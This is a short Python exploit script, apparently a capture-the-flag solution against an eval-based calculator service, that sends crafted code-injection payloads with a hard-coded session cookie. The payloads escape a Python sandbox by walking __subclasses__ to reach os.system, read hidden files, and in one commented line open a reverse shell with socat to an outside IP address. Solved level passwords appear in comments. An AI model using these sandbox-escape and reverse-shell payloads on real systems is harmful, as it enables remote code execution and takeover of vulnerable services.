import requests
import re

proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

def craft(payload, level):
	return {
		"expression": payload,
		"type": "calculate",
		"level": level
	}

def send_req(pl):
	cook = {
		"misc-calculator-session": "kkRsd/y07LSuTTSvHm+bDiqJcIt6GEGxnC2A7r366hE=ud1vT6Cv7bseOflGaxwLXi1mzTEMOX/tvNLRL02Ho9uKgkrCVRHs0MaIuOEO13/UZ1myJoo5NIxeQ6xUzOyeOg=="
	}
	r = requests.post("http://guppy.utctf.live:5957/", proxies = proxies, data=pl, cookies=cook)
	return r.text

def parse(text):
	res = re.findall(r"<pre>(.*)\n</pre>", text)
	if len(res) > 0:
		return res[0]
	else:
		print(text)
		return "No Password!"


# Level 1 : PuXqj7n4WNZzStnWbtPv
# contoh = craft("solution", 0)
# while True:
# 	res1 = send_req(contoh)
# 	print(parse(res1))

# Level 2 : Krdi9yQuY8mHoteZDCF5
# contoh = craft("__import__('os').system('cat __pycache__/random.cpython-38.pyc | base64 -w 0')", 2)
# contoh = craft("123", 2)

# Level 3 : E46Dnqb5enAMgGArbruu
# contoh = craft("__import__('os').system('cat .p')", 2)
 
# Level 4 : 5F4p7aLgQ5Nfn5YM8s68
# contoh = craft("().__class__.__bases__[0].__subclasses__()[137]()._module.__builtins__['__import__']('os').system('sh -c \"socat TCP4:103.152.118.74:12345 EXEC:/bin/bash\"')", 3)
contoh = craft("().__class__.__bases__[0].__subclasses__()[137]()._module.__builtins__['__import__']('os').system('cat .p')", 3)
while True:
	res2 = send_req(contoh)
	print(parse(res2))
	break